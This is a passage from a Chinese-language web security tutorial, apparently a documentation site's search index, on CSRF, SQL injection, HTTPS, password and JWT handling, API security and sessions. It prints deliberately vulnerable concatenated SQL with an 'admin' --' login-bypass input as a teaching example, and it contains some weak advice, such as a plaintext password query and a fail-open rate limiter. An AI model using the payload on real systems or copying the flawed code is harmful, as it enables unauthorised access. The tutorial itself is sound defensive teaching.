request.getParameter(\"_csrf\");\n\n        return sessionToken != null &amp;&amp; sessionToken.equals(requestToken);\n    }\n}\n</code></pre></li> </ol> <pre><code>&lt;!-- \u5728\u8868\u5355\u4e2d\u5305\u542bCSRF Token --&gt;\n&lt;form method=\"POST\" action=\"/transfer\"&gt;\n  &lt;input type=\"hidden\" name=\"_csrf\" value=\"${csrfToken}\" /&gt;\n  &lt;input type=\"text\" name=\"to\" /&gt;\n  &lt;input type=\"number\" name=\"amount\" /&gt;\n  &lt;button type=\"submit\"&gt;Transfer&lt;/button&gt;\n&lt;/form&gt;\n</code></pre> <ol> <li> <p>SameSite Cookie\u5c5e\u6027 <pre><code>Cookie cookie = new Cookie(\"SESSIONID\", sessionId);\ncookie.setSameSite(\"Strict\"); // \u6216 \"Lax\"\n// Strict: \u5b8c\u5168\u7981\u6b62\u7b2c\u4e09\u65b9Cookie\n// Lax: \u5141\u8bb8\u90e8\u5206\u7b2c\u4e09\u65b9Cookie\uff08GET\u8bf7\u6c42\uff09\n</code></pre></p> </li> <li> <p>\u9a8c\u8bc1Referer/Origin\u5934 <pre><code>public boolean validateReferer(HttpServletRequest request) {\n    String referer = request.getHeader(\"Referer\");\n    String origin = request.getHeader(\"Origin\");\n    return referer != null &amp;&amp; referer.startsWith(\"https://yourdomain.com\");\n}\n</code></pre></p> </li> <li> <p>\u53cc\u91cdCookie\u9a8c\u8bc1 <pre><code>// \u8bbe\u7f6eCSRF Cookie\nCookie csrfCookie = new Cookie(\"XSRF-TOKEN\", token);\nresponse.addCookie(csrfCookie);\n\n// \u9a8c\u8bc1\uff1aCookie\u503c == Header\u503c\nString cookieToken = getCookieValue(request, \"XSRF-TOKEN\");\nString headerToken = request.getHeader(\"X-XSRF-TOKEN\");\nreturn cookieToken.equals(headerToken);\n</code></pre></p> </li> </ol>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#5-sqlsql-injection","title":"5. SQL\u6ce8\u5165\u653b\u51fb\uff08SQL Injection\uff09","text":"<p>\u653b\u51fb\u793a\u4f8b\uff1a <pre><code>// \u4e0d\u5b89\u5168\u7684\u4ee3\u7801\nString username = request.getParameter(\"username\");\nString password = request.getParameter(\"password\");\nString sql = \"SELECT * FROM users WHERE username='\" + username + \n             \"' AND password='\" + password + \"'\";\n\n// \u653b\u51fb\u8005\u8f93\u5165\uff1a\n// username: admin' --\n// password: anything\n// \u751f\u6210\u7684SQL: SELECT * FROM users WHERE username='admin' --' AND password='anything'\n// -- \u662f\u6ce8\u91ca\u7b26\uff0c\u540e\u9762\u7684\u5bc6\u7801\u9a8c\u8bc1\u88ab\u6ce8\u91ca\u6389\u4e86\uff01\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <pre><code>/**\n * \u4f7f\u7528\u9884\u7f16\u8bd1\u8bed\u53e5\uff08Prepared Statement\uff09\n */\npublic User findUser(String username, String password) {\n    String sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\n\n    try (Connection conn = dataSource.getConnection();\n         PreparedStatement stmt = conn.prepareStatement(sql)) {\n\n        stmt.setString(1, username);  // \u53c2\u6570\u81ea\u52a8\u8f6c\u4e49\n        stmt.setString(2, password);\n\n        ResultSet rs = stmt.executeQuery();\n        // \u5904\u7406\u7ed3\u679c\n    }\n}\n\n/**\n * \u4f7f\u7528ORM\u6846\u67b6\uff08JPA/Hibernate\uff09\n */\n@Repository\npublic interface UserRepository extends JpaRepository&lt;User, Long&gt; {\n    // \u81ea\u52a8\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\n    User findByUsernameAndPassword(String username, String password);\n\n    // \u6216\u4f7f\u7528JPQL\n    @Query(\"SELECT u FROM User u WHERE u.username = :username AND u.password = :password\")\n    User authenticate(@Param(\"username\") String username, \n                     @Param(\"password\") String password);\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#6-man-in-the-middle-attack","title":"6. \u4e2d\u95f4\u4eba\u653b\u51fb\uff08Man-in-the-Middle Attack\uff09","text":"<p>\u653b\u51fb\u65b9\u5f0f\uff1a - \u62e6\u622a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1 - \u7a83\u53d6\u654f\u611f\u4fe1\u606f\uff08\u5bc6\u7801\u3001Token\uff09 - \u7be1\u6539\u8bf7\u6c42\u548c\u54cd\u5e94</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ol> <li> <p>\u4f7f\u7528HTTPS <pre><code>// Spring Boot\u5f3a\u5236HTTPS\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.requiresChannel()\n            .anyRequest()\n            .requiresSecure(); // \u5f3a\u5236HTTPS\n        return http.build();\n    }\n}\n</code></pre></p> </li> <li> <p>HTTP Strict Transport Security (HSTS) <pre><code>// \u544a\u8bc9\u6d4f\u89c8\u5668\u53ea\u80fd\u901a\u8fc7HTTPS\u8bbf\u95ee\nhttp.headers()\n    .httpStrictTransportSecurity()\n    .includeSubDomains(true)\n    .maxAgeInSeconds(31536000); // 1\u5e74\n</code></pre></p> </li> <li> <p>\u8bc1\u4e66\u56fa\u5b9a\uff08Certificate Pinning\uff09 <pre><code>// \u5ba2\u6237\u7aef\u9a8c\u8bc1\u670d\u52a1\u5668\u8bc1\u4e66\npublic class CertificatePinning {\n    public SSLContext createSSLContext() throws Exception {\n        // \u52a0\u8f7d\u4fe1\u4efb\u7684\u8bc1\u4e66\n        CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n        InputStream cert = getClass().getResourceAsStream(\"server.crt\");\n        Certificate ca = cf.generateCertificate(cert);\n\n        // \u521b\u5efa\u5305\u542b\u8bc1\u4e66\u7684KeyStore\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        keyStore.load(null, null);\n        keyStore.setCertificateEntry(\"ca\", ca);\n\n        // \u521b\u5efaTrustManager\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(\n            TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init(keyStore);\n\n        // \u521b\u5efaSSLContext\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, tmf.getTrustManagers(), null);\n        return sslContext;\n    }\n}\n</code></pre></p> </li> </ol>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_20","title":"\u5b89\u5168\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1","title":"1. \u5bc6\u7801\u5b89\u5168","text":"<p>\u5f3a\u5bc6\u7801\u7b56\u7565\uff1a <pre><code>/**\n * \u5bc6\u7801\u590d\u6742\u5ea6\u9a8c\u8bc1\n */\npublic class PasswordValidator {\n\n    private static final int MIN_LENGTH = 12;\n    private static final Pattern UPPERCASE = Pattern.compile(\"[A-Z]\");\n    private static final Pattern LOWERCASE = Pattern.compile(\"[a-z]\");\n    private static final Pattern DIGIT = Pattern.compile(\"[0-9]\");\n    private static final Pattern SPECIAL = Pattern.compile(\"[!@#$%^&amp;*(),.?\\\":{}|&lt;&gt;]\");\n\n    public ValidationResult validate(String password) {\n        List&lt;String&gt; errors = new ArrayList&lt;&gt;();\n\n        if (password == null || password.length() &lt; MIN_LENGTH) {\n            errors.add(\"\u5bc6\u7801\u957f\u5ea6\u81f3\u5c11\" + MIN_LENGTH + \"\u4e2a\u5b57\u7b26\");\n        }\n\n        if (!UPPERCASE.matcher(password).find()) {\n            errors.add(\"\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5927\u5199\u5b57\u6bcd\");\n        }\n\n        if (!LOWERCASE.matcher(password).find()) {\n            errors.add(\"\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\");\n        }\n\n        if (!DIGIT.matcher(password).find()) {\n            errors.add(\"\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u6570\u5b57\");\n        }\n\n        if (!SPECIAL.matcher(password).find()) {\n            errors.add(\"\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\");\n        }\n\n        // \u68c0\u67e5\u5e38\u89c1\u5f31\u5bc6\u7801\n        if (isCommonPassword(password)) {\n            errors.add(\"\u5bc6\u7801\u8fc7\u4e8e\u5e38\u89c1\uff0c\u8bf7\u4f7f\u7528\u66f4\u5f3a\u7684\u5bc6\u7801\");\n        }\n\n        return new ValidationResult(errors.isEmpty(), errors);\n    }\n\n    private boolean isCommonPassword(String password) {\n        Set&lt;String&gt; commonPasswords = Set.of(\n            \"password\", \"123456\", \"12345678\", \"qwerty\", \n            \"abc123\", \"password123\", \"admin\"\n        );\n        return commonPasswords.contains(password.toLowerCase());\n    }\n}\n</code></pre></p> <p>\u5bc6\u7801\u5b58\u50a8\uff1a <pre><code>// \u2705 \u6b63\u786e\uff1a\u4f7f\u7528BCrypt/Argon2\nString hashedPassword = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));\n\n// \u274c \u9519\u8bef\uff1a\u660e\u6587\u5b58\u50a8\nString password = \"myPassword123\";\n\n// \u274c \u9519\u8bef\uff1a\u7b80\u5355\u54c8\u5e0c\uff08MD5/SHA-256\uff09\nString md5 = DigestUtils.md5Hex(password);\n\n// \u274c \u9519\u8bef\uff1a\u53ef\u9006\u52a0\u5bc6\nString encrypted = AES.encrypt(password, secretKey);\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-token_1","title":"2. Token\u5b89\u5168","text":"<p>JWT\u6700\u4f73\u5b9e\u8df5\uff1a <pre><code>/**\n * JWT Token\u751f\u6210\u548c\u9a8c\u8bc1\n */\npublic class JWTService {\n\n    private static final String SECRET_KEY = System.getenv(\"JWT_SECRET\");\n    private static final long EXPIRATION_TIME = 3600000; // 1\u5c0f\u65f6\n\n    /**\n     * \u751f\u6210Token\n     */\n    public String generateToken(User user) {\n        Date now = new Date();\n        Date expiry = new Date(now.getTime() + EXPIRATION_TIME);\n\n        return Jwts.builder()\n            .setSubject(user.getUsername())\n            .setIssuedAt(now)\n            .setExpiration(expiry)\n            .claim(\"userId\", user.getId())\n            .claim(\"roles\", user.getRoles())\n            // \u4f7f\u7528\u5f3a\u7b97\u6cd5\n            .signWith(SignatureAlgorithm.HS512, SECRET_KEY)\n            .compact();\n    }\n\n    /**\n     * \u9a8c\u8bc1Token\n     */\n    public Claims validateToken(String token) {\n        try {\n            return Jwts.parser()\n                .setSigningKey(SECRET_KEY)\n                .parseClaimsJws(token)\n                .getBody();\n        } catch (ExpiredJwtException e) {\n            throw new TokenExpiredException(\"Token\u5df2\u8fc7\u671f\");\n        } catch (JwtException e) {\n            throw new InvalidTokenException(\"\u65e0\u6548\u7684Token\");\n        }\n    }\n\n    /**\n     * Token\u5237\u65b0\u7b56\u7565\n     */\n    public String refreshToken(String oldToken) {\n        Claims claims = validateToken(oldToken);\n\n        // \u68c0\u67e5\u662f\u5426\u5728\u5237\u65b0\u7a97\u53e3\u5185\uff08\u4f8b\u5982\uff1a\u8fc7\u671f\u524d15\u5206\u949f\uff09\n        Date expiration = claims.getExpiration();\n        long timeUntilExpiry = expiration.getTime() - System.currentTimeMillis();\n\n        if (timeUntilExpiry &lt; 900000) { // 15\u5206\u949f\n            // \u751f\u6210\u65b0Token\n            return generateToken(loadUserFromClaims(claims));\n        }\n\n        return oldToken;\n    }\n}\n</code></pre></p> <p>Token\u5b58\u50a8\uff1a <pre><code>// \u2705 \u6d4f\u89c8\u5668\u7aef\u63a8\u8350\uff1aHttpOnly Cookie\n// \u670d\u52a1\u5668\u8bbe\u7f6e\uff1a\nresponse.addCookie(createSecureCookie(\"token\", jwtToken));\n\n// \u26a0\ufe0f \u5907\u9009\uff1aLocalStorage\uff08\u5bb9\u6613\u53d7XSS\u653b\u51fb\uff09\nlocalStorage.setItem('token', jwtToken);\n\n// \u2705 \u66f4\u597d\uff1a\u4f7f\u7528sessionStorage\uff08\u5173\u95ed\u6807\u7b7e\u540e\u6e05\u9664\uff09\nsessionStorage.setItem('token', jwtToken);\n\n// \u2705 \u79fb\u52a8\u7aef\uff1a\u4f7f\u7528\u5b89\u5168\u5b58\u50a8\n// Android: EncryptedSharedPreferences\n// iOS: Keychain\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-api","title":"3. API\u5b89\u5168","text":"<p>\u8ba4\u8bc1\uff1a <pre><code>// 1. Bearer Token\u8ba4\u8bc1\n@GetMapping(\"/api/users/me\")\npublic User getCurrentUser(\n    @RequestHeader(\"Authorization\") String authHeader\n) {\n    String token = authHeader.replace(\"Bearer \", \"\");\n    return userService.getUserFromToken(token);\n}\n\n// 2. API Key\u8ba4\u8bc1\uff08\u9002\u7528\u4e8e\u670d\u52a1\u95f4\u8c03\u7528\uff09\n@GetMapping(\"/api/data\")\npublic Data getData(\n    @RequestHeader(\"X-API-Key\") String apiKey\n) {\n    if (!apiKeyService.isValid(apiKey)) {\n        throw new UnauthorizedException();\n    }\n    return dataService.getData();\n}\n\n// 3. \u7b7e\u540d\u8ba4\u8bc1\uff08\u9ad8\u5b89\u5168\u573a\u666f\uff09\n@PostMapping(\"/api/payment\")\npublic PaymentResult processPayment(\n    @RequestBody PaymentRequest request,\n    @RequestHeader(\"X-Signature\") String signature,\n    @RequestHeader(\"X-Timestamp\") long timestamp\n) {\n    // \u9a8c\u8bc1\u65f6\u95f4\u6233\uff08\u9632\u91cd\u653e\u653b\u51fb\uff09\n    if (Math.abs(System.currentTimeMillis() - timestamp) &gt; 300000) {\n        throw new RequestExpiredException();\n    }\n\n    // \u9a8c\u8bc1\u7b7e\u540d\n    String expectedSignature = calculateSignature(request, timestamp);\n    if (!signature.equals(expectedSignature)) {\n        throw new InvalidSignatureException();\n    }\n\n    return paymentService.process(request);\n}\n</code></pre></p> <p>\u901f\u7387\u9650\u5236\uff1a <pre><code>/**\n * API\u901f\u7387\u9650\u5236\uff08\u9632\u6b62\u6ee5\u7528\uff09\n */\n@Component\npublic class RateLimiter {\n\n    private final LoadingCache&lt;String, AtomicInteger&gt; requestCounts;\n\n    public RateLimiter() {\n        requestCounts = CacheBuilder.newBuilder()\n            .expireAfterWrite(1, TimeUnit.MINUTES)\n            .build(new CacheLoader&lt;String, AtomicInteger&gt;() {\n                public AtomicInteger load(String key) {\n                    return new AtomicInteger(0);\n                }\n            });\n    }\n\n    /**\n     * \u68c0\u67e5\u662f\u5426\u8d85\u8fc7\u9650\u5236\n     * @param identifier \u6807\u8bc6\u7b26\uff08IP\u3001\u7528\u6237ID\u3001API Key\uff09\n     * @param limit \u6bcf\u5206\u949f\u6700\u5927\u8bf7\u6c42\u6570\n     */\n    public boolean allowRequest(String identifier, int limit) {\n        try {\n            AtomicInteger counter = requestCounts.get(identifier);\n            return counter.incrementAndGet() &lt;= limit;\n        } catch (ExecutionException e) {\n            return true; // \u51fa\u9519\u65f6\u5141\u8bb8\u8bf7\u6c42\n        }\n    }\n}\n\n// \u4f7f\u7528\u62e6\u622a\u5668\u5e94\u7528\u901f\u7387\u9650\u5236\n@Component\npublic class RateLimitInterceptor implements HandlerInterceptor {\n\n    @Autowired\n    private RateLimiter rateLimiter;\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, \n                            HttpServletResponse response, \n                            Object handler) throws Exception {\n        String clientId = getClientIdentifier(request);\n\n        if (!rateLimiter.allowRequest(clientId, 100)) { // 100\u6b21/\u5206\u949f\n            response.setStatus(429); // Too Many Requests\n            response.getWriter().write(\"Rate limit exceeded\");\n            return false;\n        }\n\n        return true;\n    }\n\n    private String getClientIdentifier(HttpServletRequest request) {\n        // \u4f18\u5148\u4f7f\u7528\u7528\u6237ID\uff0c\u5176\u6b21\u4f7f\u7528IP\n        String userId = (String) request.getAttribute(\"userId\");\n        return userId != null ? userId : request.getRemoteAddr();\n    }\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4_3","title":"4. \u65e5\u5fd7\u4e0e\u76d1\u63a7","text":"<p>\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\uff1a <pre><code>/**\n * \u5b89\u5168\u4e8b\u4ef6\u65e5\u5fd7\n */\n@Component\npublic class SecurityLogger {\n\n    private static final Logger logger = LoggerFactory.getLogger(SecurityLogger.class);\n\n    /**\n     * \u8bb0\u5f55\u767b\u5f55\u6210\u529f\n     */\n    public void logLoginSuccess(String username, String ip) {\n        logger.info(\"Login successful - User: {}, IP: {}\", username, ip);\n    }\n\n    /**\n     * \u8bb0\u5f55\u767b\u5f55\u5931\u8d25\n     */\n    public void logLoginFailure(String username, String ip, String reason) {\n        logger.warn(\"Login failed - User: {}, IP: {}, Reason: {}\", \n            username, ip, reason);\n    }\n\n    /**\n     * \u8bb0\u5f55\u8bbf\u95ee\u88ab\u62d2\u7edd\n     */\n    public void logAccessDenied(String username, String resource, String action) {\n        logger.warn(\"Access denied - User: {}, Resource: {}, Action: {}\", \n            username, resource, action);\n    }\n\n    /**\n     * \u8bb0\u5f55\u53ef\u7591\u6d3b\u52a8\n     */\n    public void logSuspiciousActivity(String username, String activity, \n                                     Map&lt;String, Object&gt; details) {\n        logger.error(\"Suspicious activity detected - User: {}, Activity: {}, Details: {}\", \n            username, activity, details);\n\n        // \u89e6\u53d1\u544a\u8b66\n        alertService.sendSecurityAlert(username, activity, details);\n    }\n}\n</code></pre></p> <p>\u76d1\u63a7\u6307\u6807\uff1a <pre><code>// \u4f7f\u7528Micrometer\u76d1\u63a7\u8ba4\u8bc1\u6307\u6807\n@Component\npublic class AuthenticationMetrics {\n\n    private final Counter loginAttempts;\n    private final Counter loginSuccesses;\n    private final Counter loginFailures;\n    private final Timer authenticationTime;\n\n    public AuthenticationMetrics(MeterRegistry registry) {\n        this.loginAttempts = Counter.builder(\"auth.login.attempts\")\n            .description(\"Total login attempts\")\n            .register(registry);\n\n        this.loginSuccesses = Counter.builder(\"auth.login.successes\")\n            .description(\"Successful logins\")\n            .register(registry);\n\n        this.loginFailures = Counter.builder(\"auth.login.failures\")\n            .description(\"Failed logins\")\n            .tag(\"reason\", \"invalid_credentials\")\n            .register(registry);\n\n        this.authenticationTime = Timer.builder(\"auth.time\")\n            .description(\"Authentication processing time\")\n            .register(registry);\n    }\n\n    public void recordLoginAttempt() {\n        loginAttempts.increment();\n    }\n\n    public void recordLoginSuccess() {\n        loginSuccesses.increment();\n    }\n\n    public void recordLoginFailure() {\n        loginFailures.increment();\n    }\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#5_2","title":"5. \u5b89\u5168\u914d\u7f6e\u6e05\u5355","text":"<p>\u751f\u4ea7\u73af\u5883\u5b89\u5168\u914d\u7f6e\uff1a <pre><code># application.properties\n\n# \u7981\u7528\u4e0d\u5fc5\u8981\u7684HTTP\u65b9\u6cd5\nspring.mvc.dispatch-options-request=false\n\n# \u7981\u7528\u8be6\u7ec6\u9519\u8bef\u4fe1\u606f\nserver.error.include-message=never\nserver.error.include-stacktrace=never\nserver.error.include-exception=false\n\n# Session\u914d\u7f6e\nserver.servlet.session.timeout=30m\nserver.servlet.session.cookie.http-only=true\nserver.servlet.session.cookie.secure=true\nserver.servlet.session.cookie.same-site=strict\n\n# \u5b89\u5168\u5934\nserver.servlet.session.tracking-modes=cookie\n\n# \u7981\u7528\u4e0d\u5b89\u5168\u7684\u9ed8\u8ba4\u503c\nspring.security.filter.dispatcher-types=request,error,async,forward\n</code></pre></p> <pre><code>/**\n * \u5b89\u5168\u5934\u914d\u7f6e\n */\n@Configuration\npublic class SecurityHeadersConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.headers()\n            // \u9632\u6b62\u70b9\u51fb\u52ab\u6301\n            .frameOptions().deny()\n            // XSS\u4fdd\u62a4\n            .xssProtection().enable()\n            // \u5185\u5bb9\u7c7b\u578b\u55c5\u63a2\u4fdd\u62a4\n            .contentTypeOptions().enable()\n            // HSTS\n            .httpStrictTransportSecurity()\n                .includeSubDomains(true)\n                .maxAgeInSeconds(31536000)\n            // CSP\n            .and()\n            .contentSecurityPolicy(\n                \"default-src 'self'; \" +\n                \"script-src 'self' 'unsafe-inline'; \" +\n                \"style-src 'self' 'unsafe-inline'; \" +\n                \"img-src 'self' data: https:; \" +\n                \"font-src 'self' data:; \" +\n                \"connect-src 'self'\"\n            )\n            // Referrer Policy\n            .and()\n            .referrerPolicy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN);\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_21","title":"\u603b\u7ed3","text":"<p>\u8ba4\u8bc1\u6388\u6743\u662f\u5e94\u7528\u5b89\u5168\u7684\u6838\u5fc3\u57fa\u77f3\uff0c\u9700\u8981\u7406\u89e3\u4ee5\u4e0b\u5173\u952e\u70b9\uff1a</p> <ol> <li>\u8ba4\u8bc1\uff08Authentication\uff09 \u786e\u8ba4\"\u4f60\u662f\u8c01\"\uff0c\u6388\u6743\uff08Authorization\uff09 \u786e\u5b9a\"\u4f60\u80fd\u505a\u4ec0\u4e48\"</li> <li>\u4f1a\u8bdd\u7ba1\u7406 \u6709Session\u548cToken\u4e24\u79cd\u65b9\u5f0f\uff0c\u5404\u6709\u4f18\u52a3\uff0c\u9700\u6839\u636e\u573a\u666f\u9009\u62e9</li> <li>\u5bc6\u7801\u5b66 \u662f\u5b89\u5168\u7684\u57fa\u7840\uff0c\u7406\u89e3\u54c8\u5e0c\u3001\u52a0\u5bc6\u3001\u7b7e\u540d\u7684\u533a\u522b\u548c\u5e94\u7528\u573a\u666f</li> <li>\u5b89\u5168\u5a01\u80c1 \u65e0\u5904\u4e0d\u5728\uff0c\u9700\u8981\u9488\u5bf9\u6027\u9632\u62a4\uff08XSS\u3001CSRF\u3001SQL\u6ce8\u5165\u7b49\uff09</li> <li>\u6700\u4f73\u5b9e\u8df5 \u5305\u62ec\u5f3a\u5bc6\u7801\u7b56\u7565\u3001\u5b89\u5168\u7684Token\u7ba1\u7406\u3001\u5b8c\u5584\u7684\u65e5\u5fd7\u76d1\u63a7</li> </ol> <p>\u5b66\u4e60\u8def\u5f84\u5efa\u8bae\uff1a 1. \u638c\u63e1\u57fa\u7840\u6982\u5ff5\u548c\u539f\u7406\uff08\u672c\u6587\u6863\uff09 2. \u5b66\u4e60\u4e3b\u6d41\u534f\u8bae\u548c\u6807\u51c6\uff08OAuth2\u3001JWT\u3001SSO\uff09 3. \u5b9e\u8df5\u6846\u67b6\u5e94\u7528\uff08Spring Security\uff09 4. \u6df1\u5165\u67b6\u6784\u8bbe\u8ba1\uff08\u5fae\u670d\u52a1\u5b89\u5168\u3001\u5206\u5e03\u5f0f\u4f1a\u8bdd\uff09</p> <p>\u7ee7\u7eed\u5b66\u4e60\u4e0b\u4e00\u7ae0\uff1a\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/","title":"\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#_2","title":"\u76ee\u5f55","text":"<ul> <li>Cookie/Session\u673a\u5236</li> <li>Token\u8ba4\u8bc1</li> <li>OAuth 2.0\u534f\u8bae</li> <li>OpenID Connect (OIDC)</li> <li>SAML 2.0</li> <li>\u5355\u70b9\u767b\u5f55(SSO)</li> </ul>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#cookiesession","title":"Cookie/Session\u673a\u5236","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#cookie","title":"Cookie\u57fa\u7840","text":"<p>\u4ec0\u4e48\u662fCookie\uff1f</p> <p>Cookie\u662f\u670d\u52a1\u5668\u53d1\u9001\u5230\u7528\u6237\u6d4f\u89c8\u5668\u5e76\u4fdd\u5b58\u5728\u672c\u5730\u7684\u5c0f\u578b\u6587\u672c\u6587\u4ef6\uff0c\u6d4f\u89c8\u5668\u5728\u540e\u7eed\u8bf7\u6c42\u4e2d\u4f1a\u81ea\u52a8\u643a\u5e26Cookie\u3002</p> <p>Cookie\u5c5e\u6027\uff1a <pre><code>Cookie cookie = new Cookie(\"sessionId\", \"abc123\");\n\n// 1. Domain - \u6307\u5b9aCookie\u7684\u57df\u540d\ncookie.setDomain(\".example.com\"); // \u53ef\u7528\u4e8e example.com \u53ca\u5176\u5b50\u57df\n\n// 2. Path - \u6307\u5b9aCookie\u7684\u8def\u5f84\ncookie.setPath(\"/\"); // \u5bf9\u6240\u6709\u8def\u5f84\u6709\u6548\n\n// 3. Max-Age / Expires - \u8fc7\u671f\u65f6\u95f4\ncookie.setMaxAge(3600); // 3600\u79d2\u540e\u8fc7\u671f\n// -1: \u4f1a\u8bddCookie\uff08\u6d4f\u89c8\u5668\u5173\u95ed\u540e\u5220\u9664\uff09\n// 0: \u7acb\u5373\u5220\u9664\n// &gt;0: \u6301\u4e45Cookie\uff0c\u6307\u5b9a\u79d2\u6570\u540e\u8fc7\u671f\n\n// 4. HttpOnly - \u7981\u6b62JavaScript\u8bbf\u95ee\ncookie.setHttpOnly(true); // \u9632\u6b62XSS\u653b\u51fb\n\n// 5. Secure - \u4ec5\u901a\u8fc7HTTPS\u4f20\u8f93\ncookie.setSecure(true);\n\n// 6. SameSite - \u9650\u5236\u8de8\u7ad9\u53d1\u9001\ncookie.setAttribute(\"SameSite\", \"Strict\");\n// Strict: \u5b8c\u5168\u7981\u6b62\u8de8\u7ad9\u53d1\u9001\n// Lax: \u5141\u8bb8\u5b89\u5168\u7684\u8de8\u7ad9\u8bf7\u6c42\uff08GET\u5bfc\u822a\uff09\n// None: \u5141\u8bb8\u8de8\u7ad9\u53d1\u9001\uff08\u9700\u914d\u5408Secure=true\uff09\n</code></pre></p> <p>Cookie\u7684\u5c40\u9650\u6027\uff1a - \u5927\u5c0f\u9650\u5236\uff1a\u901a\u5e384KB - \u6570\u91cf\u9650\u5236\uff1a\u6bcf\u4e2a\u57df\u540d\u7ea620-50\u4e2a - \u5b89\u5168\u6027\uff1a\u5bb9\u6613\u88ab\u7a83\u53d6\uff08\u9700HTTPS + HttpOnly\uff09 - \u8de8\u57df\u9650\u5236\uff1a\u53d7\u540c\u6e90\u7b56\u7565\u9650\u5236</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#session","title":"Session\u673a\u5236","text":"<p>\u5de5\u4f5c\u6d41\u7a0b\uff1a <pre><code>1. \u5ba2\u6237\u7aef\u8bf7\u6c42 \u2192 \u670d\u52a1\u5668\n2. \u670d\u52a1\u5668\u521b\u5efaSession\u5bf9\u8c61\uff0c\u751f\u6210SessionID\n3. \u670d\u52a1\u5668\u901a\u8fc7Set-Cookie\u54cd\u5e94\u5934\u53d1\u9001SessionID\n   Set-Cookie: JSESSIONID=ABC123; Path=/; HttpOnly\n4. \u5ba2\u6237\u7aef\u540e\u7eed\u8bf7\u6c42\u81ea\u52a8\u643a\u5e26Cookie\n   Cookie: JSESSIONID=ABC123\n5. \u670d\u52a1\u5668\u901a\u8fc7SessionID\u67e5\u627eSession\u5bf9\u8c61\n</code></pre></p> <p>Java\u5b9e\u73b0\uff1a <pre><code>/**\n * Session\u7ba1\u7406\u793a\u4f8b\n */\n@Controller\npublic class SessionController {\n\n    /**\n     * \u767b\u5f55 - \u521b\u5efaSession\n     */\n    @PostMapping(\"/login\")\n    public String login(@RequestParam String username,\n                       @RequestParam String password,\n                       HttpSession session) {\n\n        // \u9a8c\u8bc1\u7528\u6237\u540d\u5bc6\u7801\n        User user = userService.authenticate(username, password);\n        if (user == null) {\n            return \"redirect:/login?error\";\n        }\n\n        // \u5b58\u50a8\u7528\u6237\u4fe1\u606f\u5230Session\n        session.setAttribute(\"userId\", user.getId());\n        session.setAttribute(\"username\", user.getUsername());\n        session.setAttribute(\"roles\", user.getRoles());\n\n        // \u8bbe\u7f6eSession\u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09\n        session.setMaxInactiveInterval(1800); // 30\u5206\u949f\n\n        return \"redirect:/dashboard\";\n    }\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u7528\u6237\n     */\n    @GetMapping(\"/api/me\")\n    @ResponseBody\n    public User getCurrentUser(HttpSession session) {\n        Long userId = (Long) session.getAttribute(\"userId\");\n        if (userId == null) {\n            throw new UnauthorizedException(\"\u672a\u767b\u5f55\");\n        }\n        return userService.findById(userId);\n    }\n\n    /**\n     * \u767b\u51fa - \u9500\u6bc1Session\n     */\n    @PostMapping(\"/logout\")\n    public String logout(HttpSession session) {\n        session.invalidate(); // 